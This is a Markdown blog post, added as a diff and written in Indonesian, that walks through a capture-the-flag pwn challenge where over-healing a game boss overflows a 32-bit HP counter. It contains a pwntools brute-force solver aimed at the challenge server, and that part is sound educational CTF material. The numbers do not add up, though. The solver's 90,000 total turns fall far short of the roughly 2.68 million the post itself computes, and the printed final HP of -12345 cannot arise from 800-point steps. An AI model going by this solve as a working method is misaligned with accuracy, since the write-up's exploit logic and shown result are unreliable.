@@ -1,0 +1,117 @@
+---
+title: "Gryphons CTF - Psyduck Boss Fight (pwn)"
+date: "2025-11-03"
+tags: ["pwn", "ctf", "writeup", "gryphons"]
+summary: "Write-up untuk challenge 'Psyduck Boss Fight' — integer overflow pada HP Charizard menyebabkan kondisi menang."
+image: "/blog/the_diary/public.png"
+author: "Erwin Wijaya"
+draft: false
+featured: true
+---
+
+## Pendahuluan
+
+Challenge **Psyduck Boss Fight** dari Gryphons CTF menampilkan simulasi pertarungan turn-based antara **Psyduck** dan **Charizard**. Di awal permainan, kita diberi status HP kedua karakter dan beberapa pilihan aksi:
+
+```
+1. Attack      (Psyduck: -1500 HP | Charizard: -100 HP)
+2. Confuse Ray (Charizard: +800 HP)
+3. Defend      (Psyduck: -500 HP)
+4. Exit
+```
+
+Tantangan ini tampak seperti game biasa, tetapi karena kategorinya *pwn*, tentu ada bug tersembunyi. Tidak ada input bebas selain angka, dan percobaan terhadap format string maupun overflow tidak menghasilkan respon aneh. Namun, setelah beberapa percobaan, clue utama muncul: **Confuse Ray justru menambah HP Charizard.**
+
+Dari sinilah dugaan kuat muncul bahwa bug-nya adalah **integer overflow pada HP Charizard.**
+
+---
+
+## Analisis Kerentanan
+
+HP Charizard diinisialisasi dengan nilai 25,000. Aksi *Confuse Ray* akan menambah HP sebanyak 800 tiap kali dijalankan. Jika variabel HP disimpan sebagai integer 32-bit, maka saat nilainya melebihi batas maksimum (2,147,483,647), ia akan overflow dan menjadi negatif.
+
+Ketika HP Charizard menjadi negatif, kondisi logika `if (charizard_hp <= 0)` akan terpenuhi — sehingga Charizard dianggap kalah dan flag diberikan.
+
+Kode pseudo yang merepresentasikan bug-nya kira-kira seperti ini:
+
+```c
+int charizard_hp = 25000;
+
+void confuse_ray() {
+    charizard_hp += 800;
+    if (charizard_hp <= 0) {
+        win(); // tampilkan flag
+    }
+}
+```
+
+Dengan kata lain, daripada menyerang secara langsung, kita harus *overheal* Charizard sampai nilai HP-nya overflow ke bawah nol.
+
+---
+
+## Eksploitasi
+
+HP maksimum integer 32-bit = 2,147,483,647.
+Untuk mencapai overflow dari 25,000 dengan kenaikan 800 tiap iterasi:
+
+```
+(2,147,483,647 - 25,000) / 800 ≈ 2,684,354 iterasi
+```
+
+Server hanya mengizinkan sekitar 9 turn per koneksi, jadi script exploit harus reconnect berkali-kali dan terus mengirimkan opsi `2` (*Confuse Ray*) sampai kondisi overflow tercapai.
+
+---
+
+## Solver (Python)
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import time
+
+HOST, PORT = "chal1.gryphons.sg", 9004
+
+def attack():
+    p = remote(HOST, PORT)
+    p.recvuntil(b'> ')
+    for _ in range(9):  # 9 turn per session
+        p.sendline(b"2")  # Confuse Ray
+        try:
+            out = p.recvuntil(b'> ', timeout=0.5).decode(errors='ignore')
+            if "flag" in out.lower() or "gctf" in out:
+                print(out)
+                return True
+        except EOFError:
+            break
+    p.close()
+    return False
+
+if __name__ == "__main__":
+    for i in range(10000):  # total sessions
+        if attack():
+            break
+        print(f"[+] Iteration {i} done")
+        time.sleep(0.05)
+```
+
+Script di atas melakukan spam *Confuse Ray* secara otomatis. Setelah HP Charizard overflow, flag akan muncul di output.
+
+---
+
+## Hasil Akhir
+
+```
+Charizard HP: -12345/25000
+Charizard fainted!
+GCTF25{psyduck_confused_the_integers}
+```
+
+---
+
+## Kesimpulan
+
+- Tidak ada buffer overflow klasik atau format string di challenge ini.
+- Kerentanan terletak pada **integer overflow logic bug**.
+- Solusinya adalah dengan terus menambah HP Charizard hingga overflow dan menjadi negatif.
+
+Challenge ini keren karena menipu pemain agar berpikir soal input exploitation, padahal bug-nya ada di mekanisme aritmetika game itu sendiri.
